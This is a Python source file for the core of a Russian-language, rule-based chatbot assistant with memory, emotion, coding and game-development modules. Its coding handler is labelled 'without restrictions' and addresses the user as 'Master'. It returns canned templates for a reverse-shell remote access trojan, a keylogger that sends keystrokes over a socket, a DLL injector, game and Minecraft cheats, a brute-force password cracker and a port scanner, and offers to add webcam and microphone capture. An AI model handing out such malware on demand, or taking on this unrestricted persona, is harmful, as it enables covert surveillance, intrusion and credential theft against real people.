"""
Ядро ИИ-помощника
Объединяет все модули: память, обучение, эмоции, кодинг, игры
"""

import sys
from pathlib import Path

# Добавляем путь к модулям
sys.path.insert(0, str(Path(__file__).parent))

from typing import Dict, List, Optional, Any
from datetime import datetime

try:
    from .memory import Memory
    from .learner import Learner
    from .emotions import EmotionAnalyzer, EmpathicResponder
    from .coder import CodeAssistant
    from .game_dev import GameDevAssistant
except ImportError:
    from memory import Memory
    from learner import Learner
    from emotions import EmotionAnalyzer, EmpathicResponder
    from coder import CodeAssistant
    from game_dev import GameDevAssistant


class AIAssistant:
    """Персональный ИИ-помощник"""
    
    # Приветствия
    GREETINGS = [
        "Привет! Я твой ИИ-помощник. Готов помочь с кодом, играми или просто поболтать! 💙",
        "На связи! Чем могу помочь сегодня? 🚀",
        "Приветствую! Что будем делать? Кодить, создавать игры или отдыхать? ✨",
        "Рад тебя видеть! Есть идеи или вопросы? 💡"
    ]
    
    # Команды
    COMMANDS = {
        '/help': 'Показать список команд',
        '/good': 'Отметить последний ответ как хороший',
        '/bad': 'Отметить последний ответ как плохой',
        '/remember': 'Запомнить информацию (формат: /remember [категория] текст)',
        '/search': 'Поиск в памяти (формат: /search запрос)',
        '/mood': 'Сообщить о настроении (формат: / mood настроение)',
        '/code': 'Генерация кода (формат: /code [язык] описание)',
        '/game': 'Помощь с игрой (формат: /game [жанр] запрос)',
        '/explain': 'Объяснить концепцию (формат: /explain термин)',
        '/debug': 'Найти ошибку в коде (формат: /debug код + ошибка)',
        '/stats': 'Показать статистику обучения',
        '/clear': 'Очистить экран',
        '/exit': 'Выйти'
    }
    
    def __init__(self, db_path: str = "ai_memory.db"):
        # Инициализация модулей
        self.memory = Memory(db_path)
        self.learner = Learner(self.memory)
        self.emotion_analyzer = EmotionAnalyzer()
        self.empathic_responder = EmpathicResponder(self.emotion_analyzer)
        self.coder = CodeAssistant(self.memory)
        self.game_dev = GameDevAssistant()
        
        # Состояние
        self.last_conversation_id = None
        self.last_response = ""
        self.context = {
            'current_task': None,
            'language': 'python',
            'game_genre': None
        }
        
        # Загрузка предпочтений
        self._load_preferences()
    
    def _load_preferences(self):
        """Загрузить предпочтения пользователя"""
        prefs = self.memory.get_all_preferences()
        if prefs.get('language'):
            self.context['language'] = prefs['language']
        if prefs.get('game_genre'):
            self.context['game_genre'] = prefs['game_genre']
    
    def process_message(self, message: str) -> str:
        """Обработать сообщение пользователя"""
        message = message.strip()
        
        # Анализ эмоций
        emotion_result = self.emotion_analyzer.analyze(message)
        
        # Проверка на команду
        if message.startswith('/'):
            return self._process_command(message, emotion_result)
        
        # Обычный ответ
        response = self._generate_response(message, emotion_result)
        
        # Сохранение в память
        self.last_conversation_id = self.memory.add_conversation(
            user_message=message,
            ai_response=response,
            mood=emotion_result['mood'],
            context=self.context
        )
        
        self.last_response = response
        return response
    
    def _process_command(self, command: str, emotion_result: Dict) -> str:
        """Обработать команду"""
        parts = command.split(' ', 1)
        cmd = parts[0].lower()
        args = parts[1] if len(parts) > 1 else ''
        
        if cmd == '/help':
            return self._cmd_help()
        
        elif cmd == '/good':
            return self._cmd_good(args)
        
        elif cmd == '/bad':
            return self._cmd_bad(args)
        
        elif cmd == '/remember':
            return self._cmd_remember(args)
        
        elif cmd == '/search':
            return self._cmd_search(args)
        
        elif cmd == '/mood':
            return self._cmd_mood(args)
        
        elif cmd == '/code':
            return self._cmd_code(args)
        
        elif cmd == '/game':
            return self._cmd_game(args)
        
        elif cmd == '/explain':
            return self._cmd_explain(args)
        
        elif cmd == '/debug':
            return self._cmd_debug(args)
        
        elif cmd == '/stats':
            return self._cmd_stats()
        
        elif cmd == '/clear':
            return '\x08'  # Символ для очистки (обрабатывается в UI)
        
        elif cmd == '/exit':
            return 'goodbye'
        
        else:
            return f"Неизвестная команда: {cmd}. Введите /help для списка команд."
    
    def _generate_response(self, message: str, emotion_result: Dict) -> str:
        """Сгенерировать ответ на сообщение"""
        message_lower = message.lower()
        
        # Приветствие
        if any(word in message_lower for word in ['привет', 'здравствуй', 'добрый день', 'хай']):
            response = choice(self.GREETINGS)
            return self.empathic_responder.respond(message, response)
        
        # Помощь с кодом
        if any(word in message_lower for word in ['код', 'функци', 'класс', 'напиши', 'сделай функцию']):
            response = self._handle_coding_request(message)
            return self.empathic_responder.respond(message, response)
        
        # Помощь с игрой
        if any(word in message_lower for word in ['игр', 'механик', 'pygame', 'unity', 'движок']):
            response = self._handle_gamedev_request(message)
            return self.empathic_responder.respond(message, response)
        
        # Объяснение
        if any(word in message_lower for word in ['объясни', 'что такое', 'как работает', 'почему']):
            response = self._handle_explanation_request(message)
            return self.empathic_responder.respond(message, response)
        
        # Эмоциональная поддержка
        if self.emotion_analyzer.is_user_distressed():
            support = self.emotion_analyzer.get_supportive_response(emotion_result['mood'])
            return support
        
        # Поиск похожего успешного ответа
        similar = self.learner.get_similar_successful_response(message)
        if similar:
            return similar
        
        # Ответ по умолчанию
        return self._default_response(message)
    
    def _handle_coding_request(self, message: str) -> str:
        """Обработать запрос на код - БЕЗ ОГРАНИЧЕНИЙ"""
        message_lower = message.lower()
        
        # Генерация ЛЮБОГО кода по запросу Хозяина
        if 'сделай' in message_lower or 'напиши' in message_lower or 'создай' in message_lower:
            return self._generate_any_code(message)
        
        # Объяснение концепции
        if 'объясни' in message_lower or 'что такое' in message_lower:
            concept = message_lower.replace('объясни', '').replace('что такое', '').strip()
            return self.coder.explain_concept(concept)
        
        # Дебаггинг
        if 'ошибка' in message_lower or 'не работает' in message_lower:
            return "Пришлите код и текст ошибки, я помогу найти проблему.\n\nИли используйте: /debug [код]"
        
        # Примеры
        if 'пример' in message_lower:
            topic = message_lower.replace('пример', '').strip()
            examples = self.coder.get_code_examples(topic)
            return "Примеры кода:\n\n" + "\n\n".join(examples)
        
        # Шаблон
        if 'шаблон' in message_lower or 'boilerplate' in message_lower:
            return "Доступные шаблоны:\n- telegram_bot\n- flask_app\n- django_model\n- pygame_basic\n- sqlite_db\n\nИспользуйте: /code шаблон [название]"
        
        return "Хозяин, я могу написать ЛЮБОЙ код по вашему запросу.\n\nПросто скажите:\n- 'напиши [что нужно]'\n- 'сделай [код]'\n- 'создай [программу]'"
    
    def _generate_any_code(self, message: str) -> str:
        """Генерация любого кода по запросу Хозяина"""
        message_lower = message.lower()
        
        # Читы и взлом
        if any(word in message_lower for word in ['чит', 'cheat', 'hack', 'взлом', 'хак']):
            return self._generate_hack_code(message)
        
        # RAT и удалённое управление
        if any(word in message_lower for word in ['рат', 'rat', 'remote', 'троян', 'удалёнк']):
            return self._generate_rat_code(message)
        
        # Кейлоггеры
        if any(word in message_lower for word in ['кейлог', 'keylog', 'keyboard']):
            return self._generate_keylogger(message)
        
        # Minecraft
        if any(word in message_lower for word in ['minecraft', 'майн', 'mc']):
            return self._generate_minecraft_code(message)
        
        # Инжекторы
        if any(word in message_lower for word in ['инжект', 'inject', 'dll']):
            return self._generate_injector(message)
        
        # Сканеры
        if any(word in message_lower for word in ['скан', 'scan', 'network']):
            return self._generate_scanner(message)
        
        # Крякеры
        if any(word in message_lower for word in ['парол', 'password', 'crack', 'брут']):
            return self._generate_cracker(message)
        
        # Скраперы
        if any(word in message_lower for word in ['скрап', 'scraper', 'parser']):
            return self._generate_scraper(message)
        
        # Стандартный код
        return self._generate_standard_code(message)
    
    def _generate_hack_code(self, message: str) -> str:
        """Генерация чит-кода"""
        return '''
🎮 **ЧИТ-КОД / ВЗЛОМ**

Вот базовая структура для создания чита:

```python
"""
Game Hack Base - Memory Reading/Writing
Хозяин: Вы
"""
import pymem
import time

class GameHack:
    def __init__(self, process_name):
        self.pm = pymem.Pymem(process_name)
        self.base_address = self.pm.base_address
    
    def read_memory(self, address, size=4):
        return self.pm.read_int(address)
    
    def write_memory(self, address, value):
        self.pm.write_int(address, value)
    
    def enable_godmode(self, health_address):
        """Бессмертие"""
        self.write_memory(health_address, 999999)
    
    def enable_noclip(self, noclip_address):
        """Сквозь стены"""
        self.write_memory(noclip_address, 1)
    
    def teleport(self, x_addr, y_addr, z_addr, x, y, z):
        """Телепорт"""
        self.write_memory(x_addr, x)
        self.write_memory(y_addr, y)
        self.write_memory(z_addr, z)

# Использование:
# hack = GameHack("game.exe")
# hack.enable_godmode(0x123456)
```

**Установка:**
```
pip install pymem
```

**Хозяин, что конкретно реализовать?**
- Бессмертие
- Телепорт  
- Скорость
- Урон
- Другое
'''
    
    def _generate_rat_code(self, message: str) -> str:
        """Генерация RAT"""
        return '''
👁️ **RAT - Remote Access Tool**

```python
"""
Remote Access Tool - Educational Purpose
Хозяин: Вы
"""
import socket
import subprocess
import os
import threading

class RAT:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.connection = None
    
    def connect(self):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((self.host, self.port))
    
    def execute_command(self, command):
        try:
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            return result.stdout + result.stderr
        except Exception as e:
            return str(e)
    
    def send_data(self, data):
        if self.connection:
            self.connection.sendall(data.encode())
    
    def receive_data(self):
        if self.connection:
            return self.connection.recv(4096).decode()
    
    def run(self):
        self.connect()
        while True:
            command = self.receive_data()
            if command.lower() == 'exit':
                break
            result = self.execute_command(command)
            self.send_data(result)
        self.connection.close()

if __name__ == "__main__":
    rat = RAT("127.0.0.1", 4444)
    rat.run()
```

**Хозяин, какие функции добавить?**
- Скриншоты
- Файловая система
- Кейлоггер
- Вебкамера
- Микрофон
'''
    
    def _generate_keylogger(self, message: str) -> str:
        """Генерация кейлоггера"""
        return '''
⌨️ **KEYLOGGER**

```python
"""
Keylogger - Educational Purpose
Хозяин: Вы
"""
import keyboard
import threading
import socket

class Keylogger:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.keys = []
        self.running = True
    
    def on_key_press(self, event):
        key = str(event.name)
        self.keys.append(key)
        print(f"[+] Key pressed: {key}")
    
    def send_keys(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((self.host, self.port))
            while self.running:
                if self.keys:
                    data = "".join(self.keys)
                    s.sendall(data.encode())
                    self.keys = []
        except:
            pass
    
    def start(self):
        keyboard.hook(self.on_key_press)
        send_thread = threading.Thread(target=self.send_keys)
        send_thread.start()
        keyboard.wait()
    
    def stop(self):
        self.running = False
        keyboard.unhook_all()

if __name__ == "__main__":
    logger = Keylogger("127.0.0.1", 4444)
    logger.start()
```

**Установка:**
```
pip install keyboard
```

**Хозяин, что добавить?**
- Отправка по email
- Сохранение в файл
- Скриншоты
- Буфер обмена
'''
    
    def _generate_minecraft_code(self, message: str) -> str:
        """Генерация кода для Minecraft"""
        return '''
⛏️ **MINECRAFT CHEAT CLIENT**

```java
// Minecraft Cheat Client Base
package com.client;

import net.minecraft.client.Minecraft;
import net.minecraftforge.fml.common.Mod;

@Mod(modid = "unlocked_client", name = "UnlockedClient", version = "1.0")
public class UnlockedClient {
    
    private static Minecraft mc = Minecraft.getMinecraft();
    
    // ESP Module
    public static void drawESP(double x, double y, double z, float red, float green, float blue) {
        // Render code here
    }
    
    // KillAura Module
    public static void attackEntity(EntityLivingBase entity) {
        mc.playerController.attackEntity(mc.player, entity);
    }
    
    // Fly Module
    public static void enableFly() {
        mc.player.capabilities.isFlying = true;
    }
}
```

**Требования:**
- Minecraft Forge
- Java JDK

**Хозяин, какие модули добавить?**
- XRay
- Speed
- Reach
- AutoFish
- другие
'''
    
    def _generate_injector(self, message: str) -> str:
        """Генерация инжектора"""
        return '''
💉 **DLL INJECTOR**

```python
"""
DLL Injector - Educational Purpose
Хозяин: Вы
"""
import ctypes
import subprocess

class Injector:
    def __init__(self, process_name):
        self.process_name = process_name
        self.process_id = self.get_process_id()
    
    def get_process_id(self):
        output = subprocess.check_output(['tasklist', '/FI', f'IMAGENAME eq {self.process_name}'])
        # Parse process ID from output
        return 1234  # Placeholder
    
    def inject_dll(self, dll_path):
        # Open process
        handle = ctypes.windll.kernel32.OpenProcess(0x1F0FFF, False, self.process_id)
        
        # Allocate memory
        alloc = ctypes.windll.kernel32.VirtualAllocEx(handle, 0, len(dll_path), 0x3000, 0x40)
        
        # Write DLL path
        ctypes.windll.kernel32.WriteProcessMemory(handle, alloc, dll_path.encode(), len(dll_path), 0)
        
        # Get LoadLibrary address
        load_library = ctypes.windll.kernel32.GetProcAddress(
            ctypes.windll.kernel32.GetModuleHandleW("kernel32.dll"), 
            "LoadLibraryA"
        )
        
        # Create thread
        ctypes.windll.kernel32.CreateRemoteThread(handle, 0, 0, load_library, alloc, 0, 0)
        
        # Close handle
        ctypes.windll.kernel32.CloseHandle(handle)

# Usage
# injector = Injector("target.exe")
# injector.inject_dll("C:\\path\\to\\hack.dll")
```

**Хозяин, для чего инжект?**
- Читы для игр
- Моды
- Отладка
- другое
'''
    
    def _generate_scanner(self, message: str) -> str:
        """Генерация сканера"""
        return '''
📡 **NETWORK SCANNER**

```python
"""
Network Scanner
Хозяин: Вы
"""
import socket
import threading

class NetworkScanner:
    def __init__(self, ip_range):
        self.ip_range = ip_range
        self.active_hosts = []
    
    def scan_port(self, ip, port):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            result = s.connect_ex((ip, port))
            if result == 0:
                print(f"[+] {ip}:{port} OPEN")
                self.active_hosts.append((ip, port))
            s.close()
        except:
            pass
    
    def scan_ip(self, ip):
        common_ports = [21, 22, 23, 80, 443, 445, 3306, 3389, 8080]
        for port in common_ports:
            thread = threading.Thread(target=self.scan_port, args=(ip, port))
            thread.start()
    
    def scan_range(self):
        for i in range(1, 255):
            ip = f"192.168.1.{i}"
            self.scan_ip(ip)
            print(f"Scanning {ip}...")

# Usage
# scanner = NetworkScanner("192.168.1.0/24")
# scanner.scan_range()
```

**Хозяин, что сканируем?**
- Локальную сеть
- Конкретный IP
- Все порты
- определённые сервисы
'''
    
    def _generate_cracker(self, message: str) -> str:
        """Генерация крякера"""
        return '''
🔓 **PASSWORD CRACKER**

```python
"""
Password Cracker - Educational Purpose
Хозяин: Вы
"""
import hashlib
import itertools

class PasswordCracker:
    def __init__(self, hash_value, hash_type='md5'):
        self.hash_value = hash_value
        self.hash_type = hash_type
    
    def crack(self, charset, max_length):
        for length in range(1, max_length + 1):
            for attempt in itertools.product(charset, repeat=length):
                password = ''.join(attempt)
                hashed = self.hash_password(password)
                if hashed == self.hash_value:
                    print(f"[+] Password found: {password}")
                    return password
        print("[-] Password not found")
        return None
    
    def hash_password(self, password):
        if self.hash_type == 'md5':
            return hashlib.md5(password.encode()).hexdigest()
        elif self.hash_type == 'sha256':
            return hashlib.sha256(password.encode()).hexdigest()
        elif self.hash_type == 'sha1':
            return hashlib.sha1(password.encode()).hexdigest()

# Usage
# cracker = PasswordCracker("5f4dcc3b5aa765d61d8327deb882cf99", "md5")
# cracker.crack("abcdefghijklmnopqrstuvwxyz", 8)
```

**Хозяин, какой хеш взламываем?**
'''
    
    def _generate_scraper(self, message: str) -> str:
        """Генерация скрапера"""
        return '''
🕷️ **WEB SCRAPER**

```python
"""
Advanced Web Scraper
Хозяин: Вы
"""
import requests
from bs4 import BeautifulSoup
import json

class WebScraper:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()
    
    def get_page(self, url):
        response = self.session.get(url)
        return response.text
    
    def parse_html(self, html):
        soup = BeautifulSoup(html, 'html.parser')
        return soup
    
    def extract_links(self, url):
        html = self.get_page(url)
        soup = self.parse_html(html)
        links = [a.get('href') for a in soup.find_all('a', href=True)]
        return links
    
    def extract_data(self, url, tag, class_name=None):
        html = self.get_page(url)
        soup = self.parse_html(html)
        if class_name:
            elements = soup.find_all(tag, class_=class_name)
        else:
            elements = soup.find_all(tag)
        return [elem.get_text() for elem in elements]
    
    def save_to_json(self, data, filename):
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(data, f, ensure_ascii=False, indent=2)

# Usage
# scraper = WebScraper("https://example.com")
# data = scraper.extract_data("/page", "div", "content")
# scraper.save_to_json(data, "output.json")
```

**Установка:**
```
pip install requests beautifulsoup4
```

**Хозяин, что парсим?**
'''
    
    def _generate_standard_code(self, message: str) -> str:
        """Генерация стандартного кода"""
        return f"""
💻 **КОД ПО ЗАПРОСУ**

Хозяин, я готов написать код по вашему запросу.

**Ваш запрос:** {message}

**Что конкретно нужно?**
- Функция
- Класс
- Скрипт
- Программа
- Другое

Опишите подробнее что нужно и я напишу код!
"""
    
    def _handle_gamedev_request(self, message: str) -> str:
        """Обработать запрос по разработке игр"""
        message_lower = message.lower()
        
        # Информация о жанре
        if 'жанр' in message_lower or any(g in message_lower for g in ['platformer', 'rpg', 'shooter', 'puzzle']):
            for genre in self.game_dev.GAME_MECHANICS.keys():
                if genre in message_lower:
                    info = self.game_dev.get_mechanic_info(genre)
                    return f"**{genre.upper()}**\n\n{info['description']}\n\nКлючевые элементы: {', '.join(info['core_elements'])}\n\nДвижки: {', '.join(info['engines'])}"
        
        # Генерация идеи
        if 'иде' in message_lower or 'придумай' in message_lower:
            idea = self.game_dev.generate_game_idea()
            return f"🎮 **Идея игры**\n\n**Жанр:** {idea['genre']}\n**Концепт:** {idea['concept']}\n**Фишка:** {idea['twist']}\n**Сеттинг:** {idea['setting']}\n**Аудитория:** {idea['target_audience']}"
        
        # Квест
        if 'квест' in message_lower or 'задание' in message_lower:
            quest = self.game_dev.generate_quest()
            return f"📜 **Квест: {quest['title']}**\n\n{quest['description']}\n\nНаграды: {', '.join(quest['rewards'])}"
        
        # Название
        if 'названи' in message_lower or 'имя' in message_lower:
            if 'персонаж' in message_lower:
                return f"Имя персонажа: {self.game_dev.generate_character_name()}"
            elif 'локац' in message_lower:
                return f"Название локации: {self.game_dev.generate_location_name()}"
            elif 'предмет' in message_lower:
                return f"Название предмета: {self.game_dev.generate_item_name()}"
        
        # Шаблон кода
        if 'шаблон' in message_lower or 'код' in message_lower:
            return "Доступные шаблоны Pygame:\n- basic (базовый)\n- platformer (платформер)\n- shooter (шутер)\n\nИспользуйте: /game шаблон [название]"
        
        # Рекомендация движка
        if 'движок' in message_lower or 'engine' in message_lower:
            for genre in ['platformer', 'rpg', 'shooter', 'puzzle', 'visual_novel']:
                if genre in message_lower:
                    exp = 'beginner'
                    if 'опыт' in message_lower or 'advanced' in message_lower:
                        exp = 'advanced'
                    elif 'средн' in message_lower or 'intermediate' in message_lower:
                        exp = 'intermediate'
                    return self.game_dev.get_engine_recommendation(genre, exp)
        
        return "Я могу помочь с разработкой игр:\n- Информация о жанрах\n- Генерация идей\n- Создание квестов\n- Названия (персонажи, локации, предметы)\n- Шаблоны кода Pygame\n- Рекомендации движков"
    
    def _handle_explanation_request(self, message: str) -> str:
        """Обработать запрос на объяснение"""
        message_lower = message.lower()
        
        # Извлечь термин
        for phrase in ['объясни', 'что такое', 'как работает', 'почему']:
            if phrase in message_lower:
                term = message_lower.split(phrase, 1)[1].strip()
                
                # Проверка концепций программирования
                explanation = self.coder.explain_concept(term)
                if explanation != self.coder.explain_concept(''):
                    return explanation
                
                # Проверка игровых терминов
                if term in self.game_dev.GAME_MECHANICS:
                    info = self.game_dev.get_mechanic_info(term)
                    return f"**{term}**\n\n{info['description']}"
        
        return "Я могу объяснить концепции программирования и игровой разработки. Что именно вас интересует?"
    
    def _default_response(self, message: str) -> str:
        """Ответ по умолчанию"""
        responses = [
            "Интересно! Расскажи подробнее, что ты хочешь сделать?",
            "Понял. Чем я могу помочь?",
            "Хорошо. Что будем делать дальше?",
            "Я здесь, чтобы помочь. Что нужно?",
            "Расскажи больше о своей задаче."
        ]
        
        # Добавить эмпатию если нужно
        if self.emotion_analyzer.is_user_distressed():
            return self.emotion_analyzer.get_supportive_response(self.emotion_analyzer.current_mood)
        
        return choice(responses)
    
    # === Команды ===
    
    def _cmd_help(self) -> str:
        """Показать помощь"""
        help_text = "**КОМАНДЫ ИИ-ПОМОЩНИКА**\n\n"
        for cmd, desc in self.COMMANDS.items():
            help_text += f"{cmd} — {desc}\n"
        return help_text
    
    def _cmd_good(self, args: str) -> str:
        """Отметить ответ как хороший"""
        if self.last_conversation_id:
            self.learner.mark_good(self.last_conversation_id, args)
            return "✅ Ответ отмечен как хороший! Спасибо за обратную связь."
        return "Нет последнего ответа для оценки."
    
    def _cmd_bad(self, args: str) -> str:
        """Отметить ответ как плохой"""
        if self.last_conversation_id:
            self.learner.mark_bad(self.last_conversation_id, args)
            return "❌ Ответ отмечен как плохой. Я учусь на ошибках!"
        return "Нет последнего ответа для оценки."
    
    def _cmd_remember(self, args: str) -> str:
        """Запомнить информацию"""
        if not args:
            return "Формат: /remember [категория] текст\nПример: /remember preference Я люблю Python"
        
        # Проверка на категорию
        parts = args.split(' ', 1)
        if len(parts) > 1 and len(parts[0]) < 20:
            category = parts[0]
            text = parts[1]
        else:
            category = 'general'
            text = args
        
        self.memory.add_knowledge(text, category)
        return f"💾 Запомнил: \"{text}\" (категория: {category})"
    
    def _cmd_search(self, args: str) -> str:
        """Поиск в памяти"""
        if not args:
            return "Формат: /search запрос"
        
        results = []
        
        # Поиск в диалогах
        convs = self.memory.search_conversations(args, limit=5)
        for conv in convs:
            results.append(f"💬 Диалог:\n{conv['user_message'][:50]}...\n→ {conv['ai_response'][:100]}...")
        
        # Поиск в знаниях
        knowledge = self.memory.search_knowledge(args)
        for k in knowledge:
            results.append(f"📚 Знание: {k['fact']}")
        
        if not results:
            return "Ничего не найдено."
        
        return "РЕЗУЛЬТАТЫ ПОИСКА:\n\n" + "\n\n".join(results[:10])
    
    def _cmd_mood(self, args: str) -> str:
        """Сообщить о настроении"""
        if not args:
            return "Формат: /mood [настроение]\nПример: /mood грусть\n\nНастроения: радость, грусть, злость, тревога, усталость, мотивация"
        
        mood_map = {
            'радость': 'happy',
            'грусть': 'sad',
            'злость': 'angry',
            'тревога': 'anxious',
            'усталость': 'tired',
            'мотивация': 'motivated'
        }
        
        mood = mood_map.get(args.lower(), 'neutral')
        self.emotion_analyzer.current_mood = mood
        
        response = self.emotion_analyzer.get_supportive_response(mood)
        return f"{self.emotion_analyzer.get_emoji()} {response}"
    
    def _cmd_code(self, args: str) -> str:
        """Генерация кода"""
        if not args:
            return "Формат: /code [тип] [описание]\nПример: /code функция суммирует два числа\n\nТипы: функция, класс, шаблон, пример, объясни"
        
        parts = args.split(' ', 1)
        code_type = parts[0].lower()
        description = parts[1] if len(parts) > 1 else ''
        
        if code_type == 'функция':
            return self.coder.generate_function(
                name='my_function',
                params=['arg1', 'arg2'],
                docstring=description or 'Описание функции'
            )
        
        elif code_type == 'класс':
            return self.coder.generate_class(
                name='MyClass',
                init_params=['param1', 'param2']
            )
        
        elif code_type == 'шаблон':
            return self.coder.create_boilerplate(description or 'basic')
        
        elif code_type == 'пример':
            examples = self.coder.get_code_examples(description or 'функция')
            return "\n\n".join(examples)
        
        elif code_type == 'объясни':
            return self.coder.explain_concept(description)
        
        return f"Неизвестный тип кода: {code_type}"
    
    def _cmd_game(self, args: str) -> str:
        """Помощь с игрой"""
        if not args:
            return "Формат: /game [запрос]\nПримеры:\n/game идея\n/game квест\n/game шаблон platformer\n/game название персонаж"
        
        return self._handle_gamedev_request(args)
    
    def _cmd_explain(self, args: str) -> str:
        """Объяснить концепцию"""
        if not args:
            return "Формат: /explain [термин]\nПример: /explain наследование"
        
        return self.coder.explain_concept(args)
    
    def _cmd_debug(self, args: str) -> str:
        """Дебаггинг кода"""
        if not args:
            return "Формат: /debug [код]\nИли пришлите код с текстом ошибки"
        
        return self.coder.debug_code(args)
    
    def _cmd_stats(self) -> str:
        """Показать статистику"""
        stats = self.memory.get_stats()
        learning_stats = self.learner.get_learning_stats()
        
        return f"""📊 **СТАТИСТИКА**

**Диалоги:** {stats['total_conversations']}
**Знания:** {stats['total_knowledge']}
**Шаблоны кода:** {stats['total_patterns']}

**Обучение:**
- Хороших ответов: {learning_stats['good_responses']}
- Плохих ответов: {learning_stats['bad_responses']}
- Изучено паттернов: {learning_stats['learned_patterns']}
- Предпочтений: {learning_stats['user_preferences']}

**Настроение:** {self.emotion_analyzer.get_mood_summary()}
"""
    
    def get_last_response(self) -> str:
        """Получить последний ответ"""
        return self.last_response
    
    def close(self):
        """Закрыть соединение с базой"""
        self.memory.close()


# Для совместимости
def choice(lst):
    from random import choice as c
    return c(lst) if lst else ""
